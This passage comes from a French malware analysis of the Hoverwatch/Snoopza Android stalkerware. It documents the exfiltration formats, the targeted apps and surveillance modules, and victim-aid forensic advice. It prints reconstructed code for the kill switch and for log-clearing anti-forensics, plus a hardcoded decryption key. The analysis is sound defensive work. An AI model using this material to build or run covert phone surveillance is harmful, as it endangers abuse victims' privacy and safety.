- `data` = contenu littéral du message en **texte clair** dans la BDD locale (avant exfil DES). Pour les médias, contient un placeholder `<Image>` / `<Sticker>` / `<Video>` / `<Audio>` / `<Document>` (cf. `m5503b0`)
- `me` = identifiant du compte de la victime sur l'app cible (numéro WhatsApp, handle Telegram, etc.) → permet d'identifier la victime depuis un dump de la BDD seul
- `name` + `chat` = identification complète des interlocuteurs et groupes
- `res` = chemin local d'une copie du fichier joint (image/audio/vidéo) — le fichier réel est copié dans le dossier de cache de l'app stalkerware avant exfil multipart

**Politique de rétention locale** :
- Max **300 messages par contact par app** (cf. `if (count > 300)` dans `C0752h$h.run()`)
- Au-delà, les plus anciens sont **supprimés localement** après envoi au C2 (les données restent côté backend Refog indéfiniment)
- Dédup temporelle par `im` (cf. `m5502a0`) : 60s pour `im=1` (texte) et `im=31`, 180s pour les médias (`im=4,5,6,7,9,11,13`), 120s par défaut

#### 9.5.2 Format JSON exfiltré (DTO `InstantMessage` + Gson)

Le DTO `p094hw.imreader.InstantMessage` est sérialisé par **Gson** vers JSON avant inclusion dans le multipart `log%04d`. Annotations `@SerializedName` directement extraites du bytecode :

| Champ Java | JSON | Type | Contenu volé |
|---|---|---|---|
| `_index` | `"N"` | int | Position du message dans la conversation |
| `_time_stamp` | `"time"` | Date | Timestamp d'envoi (ms epoch) |
| `_day_time` | `"sec"` | int | Décalage en secondes depuis minuit (timezone-relative) |
| `_seen_time` | `"seen"` | long | **Timestamp de lecture par le destinataire** (preuve de lecture) |
| `_msg_text` | `"text"` | String | **Contenu textuel du message en clair** |
| `_msg_len` | `"len"` | int | Longueur du texte (anti-tamper / stats côté C2) |
| `_direction` | `"direct"` | enum | `UNDEFINED` / `INBOUND` / `OUTBOUND` (cf. `ValsDB$MESSAGE_DIRECTION`) |
| `_from` | `"from"` | String | **Nom de l'expéditeur** (utile dans les groupes) |
| `_msg_type` | `"type"` | int | Type de contenu (cf. table 9.5.4) |

**Note importante** : le champ `_seen_time` capture la **lecture** par le destinataire (= preuve qu'un message a été lu, et quand). Pour un acteur abusif (IPV), c'est de la donnée extrêmement intrusive : permet de monitorer en temps réel l'activité de communication de la victime, pas seulement l'historique.

#### 9.5.3 Codes app `im` (à compléter par sample)

Les IDs `im` numériques mappent à chaque app cible. Reverse partiel (à confirmer) :

| `im` | App probable | Source |
|---|---|---|
| 1 | SMS générique / Texte | dédup 60s |
| 4 | Audio (vocal note) | dédup 180s |
| 5 | Vidéo | dédup 180s |
| 6 | Document/fichier | dédup 180s |
| 7 | Autre média | dédup 180s |
| 9 | (TBD) | dédup 180s |
| 11 | (TBD) | dédup 180s |
| 13 | (TBD) | dédup 180s |
| 31 | (TBD) | dédup 60s |

→ Mapping complet à dériver via instrumentation Frida sur device test (hooker `C0752h.m5507M`).

#### 9.5.4 Codes type `_msg_type`

Depuis `C0752h.m5503b0(int)` qui retourne un placeholder `<Type>` quand le texte est vide :

| `_msg_type` | Sens | Placeholder résolu via |
|---|---|---|
| 1 | Sticker | `C0756l.f5282g` |
| 2 | Image | `C0756l.f5280e` |
| 3 | (Voice/Audio call ?) | `C0756l.f5279d` |
| 4 | Vidéo | `C0756l.f5284i` |
| 5 | Audio (note vocale) | `C0756l.f5283h` |
| 6 | Document/fichier | `C0756l.f5281f` |

→ Strings réelles dépendent de la locale chargée par `C0867b0.f5982o.getString(C0756l.fXXXX)`. À résoudre depuis `res/values/strings.xml` (français disponible vu les locales `fr.refog.com` mentionnées AssoEchap).

#### 9.5.5 Cycle de vie d'un message intercepté (vue victime)

```
[Victime tape un message dans WhatsApp / Telegram / Signal / ...]
         │
         ▼
[AccessibilityService C0780r capture le node UI]
         │
         ▼
[Parser dédié (C0776p WhatsApp, C0764d Messenger, etc.) construit InstantMessage]
         │
         ▼
[InstantMessage.toDBFormat(im, name, t) → C0752h.i (DTO en mémoire)]
         │
         ▼
[C0752h.m5507M(i) → ajout queue + alarme 60s pour batch]
         │
         ▼
[m5492Q → m5493R → m5504c0 → ContentValues → INSERT INTO mpk_events]
         │
         ▼
[Si pièce jointe : m5491O copie le fichier dans dossier cache du stalkerware]
         │
         ▼
[ServiceCore sync loop → exfil HTTP multipart vers C2]
         │
         ▼
[UPDATE mpk_events SET status=1 (cf. C0752h$d)]
         │
         ▼
[Cleanup local : si > 300 msg/contact/app, suppression des plus anciens]
```

#### 9.5.6 Implications pour l'aide aux victimes

**Données potentiellement volées AVANT découverte du stalkerware** :

1. **Tous les messages textuels** envoyés et reçus depuis l'installation (~100 apps cibles, dont WhatsApp, Telegram, Signal, Threema)
2. **Les pièces jointes** (images, photos intimes, vocaux, vidéos, documents) — fichiers réels exfiltrés en multipart binary
3. **Les métadonnées de lecture** : qui a lu quoi et quand (`_seen_time`)
4. **Les identités complètes** des interlocuteurs (`name`, `chat`, `from`, `me`)
5. **Les appels VoIP** (audio enregistré + métadonnées de durée/participants pour groupes)
6. **Les SMS** classiques (via `READ_SMS`)
7. **Les contacts, calendrier, historique navigateur, bookmarks** (modules 304, 305, 313, 314)
8. **La géolocalisation continue** y compris en arrière-plan (`ACCESS_BACKGROUND_LOCATION`)
9. **Les screenshots** réguliers (Android < 11) et **photos caméra frontale silencieuses** (module 319)
10. **Les frappes clavier** (keylogger via Accessibility) → mots de passe, recherches, drafts non envoyés

**Recommandations triage forensic** (CSIRT / accompagnement victime) :
- **Préserver la preuve avant uninstall** : dump `/data/data/com.android.core.{mntan|mngam}/databases/` (si root disponible) ou via `adb backup` (Android < 12)
- **Lister les comptes potentiellement compromis** depuis le champ `me` de `mpk_events` → forcer reset password sur ces comptes
- **Identifier les conversations sensibles** depuis `chat` et `name` → alerter les interlocuteurs (notamment professionnels de santé, avocats, refuges)
- **Vérifier les médias copiés** dans le dossier cache du stalkerware (potentielles photos intimes ré-exposables)
- **Changer les credentials** de toutes les apps listées dans `m4841x()` (cf. §10) : la frappe a pu être enregistrée
- **Désactiver l'authentification par SMS/2FA SMS** si le téléphone était compromis (les codes ont fui)
- **Côté légal** : demander à Refog (via leur DPO si UE / via subpoena sinon) la liste des données exfiltrées et leur suppression — l'`ActivationID` retrouvé dans les SharedPreferences identifie l'opérateur abuseur

---

## 10. Applications ciblées — Classe `p053c.p077c.p081d.C0626d`

### 10.1 Messageries (54 apps, flag 304)

**Messaging** : WhatsApp, Facebook Messenger, Viber, Telegram, Telegram Plus, Google Hangouts, Google Chat, Google Meet, Snapchat, imo, LINE, LINE Lite, TextMe, Kik, WeChat, Signal, Discord, Microsoft Teams, KakaoTalk, Threema Work, Threema OnPrem, Vidogram, Zalo, Slack, Slack Intune, BBM Enterprise

**Social** : Instagram, VK Messenger, VKontakte, Odnoklassniki, TikTok, TikTok Lite, Tumblr, Weico (Weibo), Reddit, Twitter/X, Skype

**Dating (10 apps — IPV)** : Tinder, Tinder RU, Mamba, Pure, Fitil, Wamba, Muzmatch, Skylove, Boo, Waplog, Galaxy (RU)

**Email** : Gmail, Yandex Mail, Mail.ru, BlueMail, Outlook, Outlook Lite, Samsung Email

### 10.2 Navigateurs (44+ apps, flag 305)

Chrome, Firefox, Opera, Opera Mini, UC Browser, Yandex Browser, **Tor Browser**, DuckDuckGo, Edge, Samsung Internet, Brave, Kiwi, Cromite, Huawei Browser, MIUI Browser, Vivo Browser, OPPO/Heytap Browser, ASUS Browser, Sony Browser, HTC Browser, Quark, TCL, Adblock Plus, et ~20 autres

### 10.3 SMS (flag 313)

Google Messages + apps ajoutables dynamiquement via config serveur

### 10.4 Observations

- **100+ apps** ciblées au total
- **Fort biais russophone** : VK, OK, Yandex, Mail.ru, Mamba, Tinder RU, Galaxy
- **10 apps de dating** → surveillance relationnelle / IPV
- **Signal et Threema** ciblées via Accessibility → **contourne le chiffrement E2E**
- **Tor Browser** ciblé → tentative de surveiller la navigation anonyme
- **Config dynamique** : le serveur peut ajouter des apps à surveiller à distance
- **Strings chiffrées** : certains packages obfusqués via `C0870h.m6219c()` (DES)

---

## 11. Géolocalisation — Classe `p053c.p077c.p080c.C0616e`

### 11.1 Données collectées

```json
{
  "loc": {
    "cat": 1,
    "crd": [48.8566, 2.3522],
    "acc": 15.0,
    "spd": 25.2,
    "ssid": "MonWifi",
    "bssid": "AA:BB:CC:DD:EE:FF",
    "cellid": "208-01-1234-5678"
  }
}
```

### 11.2 Base de données locale

```sql
-- Événements GPS
CREATE TABLE mpk_events (
    _id INTEGER PRIMARY KEY AUTOINCREMENT,
    uuid VARCHAR NOT NULL,
    status INTEGER DEFAULT 0 NOT NULL,
    latitude FLOAT,
    longitude FLOAT,
    category INTEGER NOT NULL,
    speed INTEGER,
    accuracy FLOAT,
    cellid VARCHAR,
    bssid VARCHAR,
    ssid VARCHAR
);

-- Cache WiFi (BSSID → coordonnées)
CREATE TABLE mpk_wifi_location (
    bssid VARCHAR PRIMARY KEY,
    ssid VARCHAR,
    mnc INTEGER DEFAULT -1,
    lac INTEGER DEFAULT -1,
    date INTEGER,
    moveable INTEGER DEFAULT 0,
    latitude FLOAT,
    longitude FLOAT,
    category INTEGER NOT NULL,
    accuracy FLOAT
);

-- Cache cellulaire
CREATE TABLE mpk_cell_location (
    cellid VARCHAR PRIMARY KEY,
    mnc INTEGER DEFAULT -1,
    mcc INTEGER DEFAULT -1,
    lac INTEGER DEFAULT -1,
    cid INTEGER DEFAULT -1,
    date INTEGER,
    latitude FLOAT,
    longitude FLOAT,
    category INTEGER NOT NULL,
    accuracy FLOAT
);
```

---

## 12. Settings / État — Classe `p094hw.utils.C0888z`

| Clé SharedPreferences | Type | Usage |
|-----------------------|------|-------|
| `ActivationID` | String (DES) | Clé d'authentification C2 |
| `Password` | String (DES) | PIN de l'acheteur |
| `domains` | String (DES) | Liste des domaines C2 |
| `EnableMonitor` | Boolean | Activation surveillance |
| `HideIcon` | Boolean | Masquer l'icône launcher |
| `PinProtect` | Boolean | Protection par PIN |
| `ValidThrough` | Long | Timestamp expiration licence |
| `Subscription` | String (DES) | Type abonnement |
| `AppInstState` | Int (enum) | NOT_INSTALLED / INSTALLED / UNINSTALL_ASK |
| `SyncServerLastTime` | Long | Dernier sync réussi |
| `SynchServerLastTime` | Long | Dernier sync (variante) |
| `SettingsVersion` | Long | Version settings serveur |
| `Version` | String | Version app |
| `DebugMode` | Boolean | Mode debug |
| `MemoryLimit` | Boolean | Limite mémoire atteinte |
| `UserPermState-{id}` | Int | État de chaque permission |
| `UserPermSent-{id}` | Boolean | Permission reportée au serveur |

### 12.1 Gestion de licence

- **Validité** : `ValidThrough` + 7 jours de grâce (604800000 ms)
- **Verrouillage** : `ValidThrough` + 42 jours (3628800000 ms)
- **Période sync normale** : 5 min
- **Période sync erreur licence** : 720 min (12h)
- **Kill switch** : code 410 → `C0744c.m5393a()` puis `m5395c()` (cf. §20). Note v3 : la classe est `C0744c` dans Snoopza, `C0743c` dans Hoverwatch (décalage JADX numbering).

---

## 13. Vulnérabilités identifiées

| # | Vulnérabilité | Sévérité | Impact |
|---|---------------|----------|--------|
| 1 | Pas de vérification SSL (TrustAll + HostnameVerifier=true) | **CRITIQUE** | MITM trivial |
| 2 | DES/ECB avec clé effective `"vallengt"` hardcodée (dérivée de `"val"` + padding `"length 8"`) | **CRITIQUE** | Déchiffrement de toutes les données locales ET des domaines C2 seedés in-binary |
| 3 | Services/Receivers exportés (`exported="true"`) | **HAUTE** | Contrôle local par app tierce |
| 4 | Kill switch distant (HTTP 410) | **HAUTE** | Suppression preuves à distance |
| 5 | Pas de certificate pinning | **HAUTE** | Proxy interception sans modification APK |
| 6 | Credentials acheteur récupérables | **HAUTE** | Identification de l'abuseur via forensics |
| 7 | Domaines C2 en clair après déchiffrement DES | MOYENNE | IOC extraction facilitée |
| 8 | Screenshots JPEG qualité 40% | FAIBLE | Qualité faible mais suffisante pour lire du texte |
| 9 | Notifications foreground vides | FAIBLE | Détectable (Android 13+) |
| 10 | Keylogger via AccessibilityService | **HAUTE** | Capture de tous les mots de passe saisis |
| 11 | Caméra frontale silencieuse (module 319) | **HAUTE** | Photos de la victime à son insu |
| 12 | Configuration modules à distance | **HAUTE** | L'abuseur active/désactive la surveillance sans accès physique |

---

## 14. Mapping des classes obfusquées

| Classe obfusquée | Nom réel | Rôle |
|------------------|----------|------|
| `p094hw` | `hw` | Package principal Hoverwatch |
| `p092e.p093a.C0736a` | `HttpClient` | Client HTTP C2 |
| `p092e.p093a.C0737b` | `NetworkUtils` | Vérification réseau |
| `p092e.p093a.C0739d` | `TrustAllManager` | TrustManager permissif |
| `p094hw.utils.C0888z` | `Settings` | SharedPreferences / état |
| `p094hw.utils.C0870h` | `CryptoHelper` | Chiffrement DES |
| `p094hw.utils.C0874l` | `Logger` | Logging interne |
| `p094hw.utils.C0877o` | `Utils` | Utilitaires divers |
| `p094hw.utils.C0887y` | `ModuleConfig` | Configuration des modules |
| `p094hw.utils.C0873k` | `EventTracker` | Tracking événements |
| `p094hw.utils.C0863b0` | `AppConstants` | Constantes globales |
| `p053c.p077c.p081d.C0626d` | `TaskSendEvents` | Collecteur IM/Browser/SMS |
| `p053c.p077c.p080c.C0616e` | `ObserverLocation` | Collecteur GPS |
| `p053c.p077c.p079b.C0611d` | `ScreenCapture` | Capture d'écran |
| `p094hw.imreader.C0776p` | `WhatsAppParser` | Parser WhatsApp |
| `p094hw.imreader.C0764d` | `MessengerParser` | Parser Facebook Messenger |
| `p094hw.imreader.C0769i` | `InstagramParser` | Parser Instagram |
| `p094hw.recorder.C0856j` | `AudioRecorder` | Enregistrement audio |
| `p094hw.database.C0751h` | `IMDatabase` | Base messages IM |
| `p094hw.database.C0747d` | `ContentObserverCollector` | Collecteur ContentProvider |
| `p094hw.core.C0743c` | `UninstallManager` | Auto-désinstallation |

---

## 20. Kill switch `C0744c` (v3 — Snoopza, équiv. `C0743c` Hoverwatch)

### 20.1 Architecture

Contrairement à ce que le terme "kill switch" suggère, **il n'y a PAS d'auto-désinstallation silencieuse**. Le mécanisme est en deux phases :

**Phase 1 — Mise en état `UNINSTALL_ASK`** (méthode `C0744c.m5393a()`) :
```java
public static void m5393a() {
    if (C0892z.m6618o() != APP_STATE_UNINSTALL_ASK) {
        C0892z.m6641z0(APP_STATE_UNINSTALL_ASK);
        if (f5154a != null) f5154a.mo4066a(null);  // callback registered by ActivityMain
    }
}
```

Déclencheurs identifiés via `search_method_by_name("m5393a")` :
- `p092e.p093a.C0737a` — quand le C2 renvoie HTTP 410
- `p053c.p077c.p081d.C0624b` (TskInit) — probablement si licence expirée localement (timer `ValidThrough + 42 jours`)
- `com.utils.receivers.ReceiverUserPresent` — au déverrouillage de l'écran (priority `2147483646` = max possible)

**Phase 2 — Affichage du prompt système** (méthode `C0744c.m5395c(activity, z)`) :
```java
public void mo4061a() {
    activity.startActivityForResult(
        new Intent("android.intent.action.DELETE", C0881o.m6360j0()),
        1002
    );
}
```

→ C'est un `Intent.ACTION_DELETE` Android **standard**. L'utilisateur voit le prompt natif Android : *"Voulez-vous désinstaller cette app ?"*. Pas de bypass de l'UI Android.

### 20.2 Vecteurs d'affichage du prompt

- `ActivityMain.onCreate()` — au prochain launch user
- `ReceiverUserPresent` — au prochain déverrouillage écran (priority max → s'exécute avant tout)

### 20.3 Social engineering — pourquoi ça marche

Le nom de package est `com.android.core.mntan` (Hoverwatch) ou `com.android.core.mngam` (Snoopza). Quand le prompt Android natif s'affiche, il liste l'app par son **applicationLabel** (générique style `Android Monitor` ou `System Service`) avec son icône système. **L'utilisateur a de fortes chances de cliquer OK par réflexe**, croyant qu'il s'agit d'un nettoyage système légitime.

### 20.4 Pourquoi Refog implémente ça

Hypothèses :
- **Réduction de la surface forensique** : si la licence n'est pas renouvelée, l'app disparaît du device → moins de traces post-mortem si l'utilisateur lance une analyse plus tard
- **Containment de breach** : si Refog détecte une compromission de leur C2 ou un takedown imminent, ils peuvent envoyer 410 à toutes les instances pour cleanup massif
- **Réponse aux ordres légaux** : permet de couper une instance individuelle sans nécessiter accès physique au device

### 20.5 Détection / IoC

Sur device :
- SharedPreferences key `AppInstState` = `2` (UNINSTALL_ASK) — visible dans `/data/data/com.android.core.X/shared_prefs/`
- Intent `android.intent.action.DELETE` avec `requestCode=1002` lancé

Sur réseau :
- Réponse C2 avec **HTTP 410** sur n'importe quel endpoint `/api/online/*`

---

## 21. Anti-forensics — Logcat scraping & clearing (v3)

Classe interne `p094hw.utils.C0878l$a extends AbstractC0883q`. 4 strings DES déchiffrées :

```
A+lQI+gVHJo=                    → "logcat"
0Uji2E/esiv4G0Mf1dQghVqVAqSyHaJX → " -d -v time -b crash "
KCiTyJ1RfIhtFxFtjPmoopa89NVCKFvN → "E/AndroidRuntime"
WoCJfsNr1es=                    → " -c"
```

Reconstitution du flow :
```java
// 1. Lire les crashes Java récents
String cmd = "logcat" + " -d -v time -b crash " + "###:F";  // C0867b0.f5983p = "###"
ArrayList lines = C0876j.m6249a(cmd);

// 2. Filtrer les stack traces E/AndroidRuntime
for (String line : lines) {
    String filtered = line.replace("E/AndroidRuntime", "");
    if (!filtered.isEmpty()) result += filtered + "\n";
}

// 3. Envoyer au C2 via le canal logs
if (result.indexOf("###") > -1) {
    C0878l.m6257o(result, "FE");           // tag "FE" = Forced Exception ?
    C0877k.m6253q(65, result);             // event id 65
}

// 4. CLEAR les logs système (anti-forensics)
Runtime.getRuntime().exec("logcat" + " -c");
```

**Deux capacités combinées** :

1. **Crash exfiltration** vers le C2 — Refog reçoit les stack traces Java de **tous les crashes Android** survenus sur le device (pas juste les leurs). Permet de monitor :
   - Quels antivirus / outils de détection sont actifs
   - Quelles autres apps crashent (intelligence sur le comportement utilisateur)
   - Bugs dans leurs propres composants pour debug remote

2. **Log clearing** — `logcat -c` purge le buffer logs système côté victime. Si un investigateur ou l'utilisateur lance `adb logcat` ou un outil forensic, **toutes les traces sont effacées**.

**Limitations Android modernes** :
- `READ_LOGS` est **signature-level depuis Android 4.1** (2012) — non grantable à une app standard
- `Runtime.exec("logcat")` lancé depuis un process app n'a accès qu'**au log de son propre PID** depuis Android 4.1
- Donc cette branche est **dormante** sur device non-rooté ou sans firmware OEM custom
- Reste **active** sur : devices rootés, OEM avec accord pré-installé, ROMs custom, devices Chinese non-Google

→ Refog **a investi du code et de l'obfuscation DES** pour cette feature → ils ont des clients sur ces devices.

---

## 22. Flow installer — `ActivityInstaller` (v3)

### 22.1 Architecture

`p094hw.installer.ActivityInstaller` extends `ActivityC0427e` (FragmentActivity), gère un **stack de fragments** (`Stack<String> f5497o`) avec une transition séquentielle. ViewModel partagé : `C0844b` (lifecycle-aware).

La méthode pivot `m5816B()` (push fragment suivant) n'est pas décompilable par JADX — mais `onBackPressed()` révèle la **séquence canonique des 11 fragments** dans l'ordre du stack :

### 22.2 Séquence des 11 fragments

| # | Fragment | Rôle |
|---|---|---|
| 1 | `FragmentInstallHello` | Écran d'accueil (branding HWA/SNPA selon build) |
| 2 | `FragmentInstallLicense` | Acceptation EULA / licence |
| 3 | `FragmentInstallCheckOldVersions` | Détecte versions précédentes du package, propose migration |
| 4 | `FragmentInstallMonitorType` | **Sélection `user_type`** : `CHILD_DEVICE` (0) / `EMPLOYEE_DEVICE` (1) / `OWN_DEVICE` (2) — stockée dans `C0844b.f5688m` |
| 5 | `FragmentInstallLogin` | Saisie credentials (`username`, `password`) → POST `api/online/registration/` |
| 6 | `FragmentInstallLogSelection` | **Sélection des modules de surveillance à activer** (cf. §22.3) |
| 7 | `FragmentInstallSysPermissions` | Demande des permissions runtime Android (50+ méthodes — la plus complexe) |
| 8 | `FragmentInstallAccessibilityService` | Ouvre `Settings.ACTION_ACCESSIBILITY_SETTINGS`, demande l'activation manuelle |
| 9 | `FragmentInstallScreenshots` | Demande la permission `MediaProjection` via `ScreenshotCheckerActivity` |
| 10 | `FragmentInstallPIN` | Configure le PIN de protection (DES-encrypted dans SharedPref `Password`) |
| 11 | `FragmentInstallFinish` | Active `EnableMonitor=true`, lance `ServiceCore`, optionnellement `HideIcon=true` |

### 22.3 Modules togglables au setup — méthode `m5819y()`

La méthode `m5819y()` synchronise le ViewModel avec les valeurs côté `C0891y` (config persistée) pour **18 modules de surveillance** :

| Toggle key | Collector ID | Module |
|---|---|---|
| `CALLS` | 312 | Enregistrement appels téléphoniques |
| `LOCATION` | 314 | GPS + WiFi BSSID + Cell ID |
| `SMS` | 313 | SMS via Google Messages |
| `SELFIE` | 317 | Photos caméra (frontale par défaut, cf. `frcam`) |
| `GALLERY` | 319 | Photos galerie + caméra frontale silencieuse |
| `APPS` | 307 | Apps installées + utilisation |
| `TEXT` | 301 | Keylogger texte (toutes les frappes) |
| `CONTACTS` | 315 | Contacts via ContentProvider |
| `CALENDAR` | 316 | Événements calendrier |
| `SYSTEM` | 308 | Événements système (boot, batterie, etc.) |
| `CHATS` | 304 | Messages IM (WhatsApp, Telegram, Signal, etc.) |
| `WEBSITES` | 305 | Historique navigateur (44+ apps) |
| `CALLREC` | 312 | Enregistrement audio des appels (rec sub-flag de CALLS) |
| `CHATREC` | 304 | Enregistrement audio appels VoIP IM (rec sub-flag de CHATS) |
| `SCREENSHOTS` | 302 | Captures d'écran périodiques |
| `WEBSCREENSHOTS` | 305 | Screenshot lors de chaque visite URL |
| `IMSCREENSHOTS` | 304 | Screenshot lors de chaque message IM |
| `SMSSCREENSHOTS` | 313 | Screenshot lors de chaque SMS |

→ **L'acheteur fait son shopping de modules à l'installation**, mais Refog peut tout réactiver ensuite via la config distante (cf. §6.4). Le toggle initial = UX trompeuse : ce qui n'est pas activé au setup peut l'être à distance sans notification.

### 22.4 Validation finale — `m5820z()`

```java
public boolean m5820z() {
    C0742a a = C0742a.m5374p(this);
    if (!a.m5390w() || !C0881o.m6291B0()) return true;     // pas tout permis
    int sdk = Build.VERSION.SDK_INT;
    if (sdk >= 23 && (!a.m5391x() || !a.m5388u())) return true;  // permissions runtime manquantes
    if (sdk >= 21 && !a.m5389v()) return true;               // device admin pas accordé
    return !(!C0742a.m5379z());                              // accessibility service activé ?
}
```

Retourne `true` si **encore quelque chose à configurer**. Tant que `true`, l'installer ne sort pas — il rejoue le fragment manquant.

### 22.5 État final stocké

À la fin du flow, `C0892z.m6641z0(APP_STATE_INSTALLED)` est appelé. Les fields `C0867b0` exposés au runtime contiennent toute la config installer (`f5688m` = monitor type, etc.) qui est ensuite envoyée dans le premier sync `api/online/registration/`.

---

## 16. Attribution & architecture multi-brand (v2 — 2026-04-20)

### 16.1 Attribution — Refog Inc.

**Hoverwatch est édité par Refog Inc.**, entreprise avec façade US (Crunchbase, BestPhoneSpy) et background historique russe/ukrainien (keylogger Refog Keylogger pour Windows depuis ~2002). Refog opère également **Snoopza** (snoopza.com) et probablement d'autres brands à confirmer.

Domaines liés à Refog dans AssoEchap/stalkerware-indicators pour Hoverwatch :
`br/de/es/fr/hu/it/nl/ro.refog.com`, `hover.watch`, `hoverwatch.com`, `hws.icu`, `my.hws.icu`, `prospybubble.com`, `refog.com`, `refog.de`, `refog.net`, `refog.org`, `www.hoverwatch.com`, `www.refog.com`

⚠️ **Note de prudence** : AssoEchap regroupe aussi `highstermobi.com` et `prospybubble.com` sous Hoverwatch, mais les sources OSINT attribuent **Highster Mobile à The Powerline Group (NYC, 2010)**, entité distincte. Le groupement AssoEchap est probablement basé sur infrastructure partagée (IP/certs TLS) et non sur une attribution corporate, à consolider avec passive DNS.

### 16.2 Preuve binaire — Hoverwatch ⇌ Snoopza = même codebase

Analyse comparative Hoverwatch v7.5.369 ↔ Snoopza v6.5.83 via JADX MCP :

| Artefact | Hoverwatch | Snoopza | Identique ? |
|---|---|---|---|
| Package | `com.android.core.mntan` | `com.android.core.mngam` | Template parallèle |
| Version | 7.5.369 | 6.5.83 | Numérotation marketing indépendante |
| Classe HTTP | `p092e.p093a.C0737a` (`e.a.a`) | `p092e.p093a.C0737a` (`e.a.a`) | ✅ Identique |
| Fields de `C0737a` | `f5120a`→`f5126g`, mêmes indices, mêmes types | idem | ✅ Bit-à-bit |
| Static init `C0737a` | `f5124e = b0.f6028x ? "SNPA" : b0.f6025u ? "HWA_TST" : "HWA"` | `f5124e = b0.f5991x ? "SNPA" : b0.f5988u ? "HWA_TST" : "HWA"` | ✅ Identique modulo numérotation JADX |
| Méthodes de `C0737a` | `m5323A`→`m5357z` | idem | ✅ Identique |
| Endpoints C2 | `api/online/*` (7 routes) | `api/online/*` (7 routes) | ✅ Identique |
| User-Agent | `Android Monitor {version}` | idem | ✅ Identique |
| Tags de log | `HCl`, `TsDtSnd`, `DMN:`, `St`, `TskInit` | idem | ✅ Identique |
| TrustManager bypass | `C0740d` (`e.a.d`) | `C0740d` (`e.a.d`) | ✅ Identique |
| Payload registration | mêmes clés JSON (`username`, `hid`, `device.perm_*`, etc.) | idem | ✅ Identique |
| Crypto helper | `p094hw.utils.C0870h` → clé `vallengt` | `p094hw.utils.C0874h` → clé `vallengt` | ✅ Identique |
| Collecteurs | 14 modules (302, 304, 305, 312, 313, 314, 319, …) | idem | ✅ Identique |
| `providers.json` (asset orphelin) | 5714 bytes | 5714 bytes | ✅ Même fichier |

**Décalage systématique de ~3 unités** dans la numérotation JADX entre les deux builds (ex: `C0870b0` ↔ `C0867b0`, `C0895z` ↔ `C0892z`, `C0874h` ↔ `C0874h`). C'est un artefact de numérotation JADX qui dépend du nombre total de classes dans le DEX — Snoopza a quelques classes de moins (branding : activités, strings resources), d'où le décalage. Les vrais noms DEX (`e.a.a`, `hw.utils.*`) sont probablement identiques.

**Conclusion** : Hoverwatch et Snoopza sont **un seul produit** compilé en deux build variants Gradle (probablement via `productFlavors { hoverwatch { applicationId ...; buildConfigField "boolean" "IS_SNOOPZA" "false" } ; snoopza { applicationId ...; buildConfigField "boolean" "IS_SNOOPZA" "true" } }`). Le flag `b0.fXXXXx` (constante `static final` inlinée par R8) déterminé au build switch :
- Le `user_type` envoyé au C2 (`HWA` vs `SNPA`)
- Le blob DES des domaines C2 à seeder (cf. §3.6.1)
- L'`applicationId` et donc le package name
- Le branding (icônes, strings resources) — à confirmer via diff resources

### 16.3 Implications

1. **IOCs au niveau code** : la présence du ternaire `"SNPA" : "HWA_TST" : "HWA"` dans `C0737a` est une **signature forte pour rule YARA / signature statique** — tout APK contenant ce pattern appartient à l'écosystème Refog.

2. **Multiplication des marques** : Refog peut produire N brands supplémentaires avec un simple ajout de `productFlavor` + push de nouveau build vers la marketplace. Chaque brand nouvelle demande juste :
   - Un nouvel `applicationId` (`com.android.core.XXXXX`)
   - Un nouveau blob DES de domaines C2 à ajouter dans la condition de `C0624b.mo4063f()`
   - Une nouvelle valeur dans le ternaire de `C0737a` (`XXXX : ...`)

3. **Pattern industriel** : cohérent avec le multi-branding documenté pour l'écosystème Brainstack/Struktura (mSpy, uMobix, Xnspy, Eyezy, Detectico, mLite, Scannero) — **stratégie de dilution du risque légal et de segmentation marketing par brand**.

---

## 17. Assets orphelins (v2)

### 17.1 `providers.json` — 5714 bytes

Fichier ISPDB-style (format K-9 Mail / Thunderbird autoconfig) présent dans les deux APKs (Hoverwatch et Snoopza). Contient la config SMTP auto-discovery de ~20 providers mail (Gmail, Yahoo, Outlook, Yandex, Mail.ru, iCloud, Zoho, GMX, QQ, etc. — `starttls`, `port`, `hostname`, `ssl`).

**Utilisation dans le code : AUCUNE.**

Recherches exhaustives négatives :
| Recherche | Résultat |
|---|---|
| `providers.json` (nom de fichier) | 0 |
| `domain-match` (clé unique du JSON) | 0 |
| `smtp`, `starttls`, `messagingengine` | 0 |
| `javax.mail`, `MimeMessage`, `Transport.send`, `Session.getInstance` | 0 |
| `getAssets` (appel métier) | 0 (uniquement framework Android) |
| `DexClassLoader`, `PathClassLoader`, `loadDex` | 0 |

**Conclusion** : fichier orphelin, vraisemblablement artefact d'une lib tierce embarquée (potentiellement K-9 Mail ou dérivé) pour une feature "send report by email" jamais activée ou tuée. ProGuard/R8 ne strippe pas les assets par défaut → persiste à travers les releases.

**Pour le SoK** : finding notable — "Hoverwatch ships a SMTP autoconfig database (20+ providers) but does not implement any email-based exfiltration channel; all exfiltration is HTTP(S) to the hardcoded C2. Typical technical debt pattern in commercial stalkerware."

---

## 18. Absence de code natif (v2 — DexDispatch)

Run DexDispatch sur l'APK (20/04/2026) :

```
[dexdispatch] Building DEX callgraph (LIEF)...
  Methods: 16504
  Native: 0
  Call edges: 59041
[dexdispatch] Entrypoints: 67
  Native boundaries: 0
  Tainted boundaries: 0
```

**Aucune méthode `native`, aucune frontière JNI.** Tout Hoverwatch est Java pur. Implications :
- Pas besoin de Kharon pour l'analyse
- Pas de libs `.so` custom à reverser
- Pas de parsing natif de `providers.json` ou d'autres assets
- Simplicité de l'architecture = reliance sur l'obfuscation R8 et le chiffrement DES (tous deux contournables)

Confirmation côté `jadx-mcp` : `search_classes_by_keyword("loadLibrary")` = 0, `search_classes_by_keyword("System.load")` = 0, méthodes `native` déclarées = 0.

---

## 19. TODO

### Terminé

- [x] Analyser le protocole C2 complet (endpoints, auth, codes HTTP)
- [x] Documenter le chiffrement DES et la clé hardcodée (**corrigé v2 : `vallengt`**)
- [x] Identifier les 100+ apps ciblées (IM, navigateurs, dating)
- [x] Analyser le service d'enregistrement audio
- [x] Analyser la capture d'écran (MediaProjection)
- [x] Analyser l'interception IM (AccessibilityService + parsers WhatsApp, etc.)
- [x] Documenter la géolocalisation (GPS + WiFi + Cell + schéma SQL)
- [x] Extraire la configuration distante (settings JSON, modules)
- [x] Identifier les modules keylogger (keys) et caméra frontale (frcam/319)
- [x] Générer la spec JSON complète du protocole C2 (`hoverwatch_c2_protocol.json`)
- [x] **Extraire les domaines C2 par défaut** — seedés in-binary via blobs DES (cf. §3.6) — v2
- [x] **Vérifier s'il y a du code natif** — confirmé 0 méthode native via DexDispatch — v2
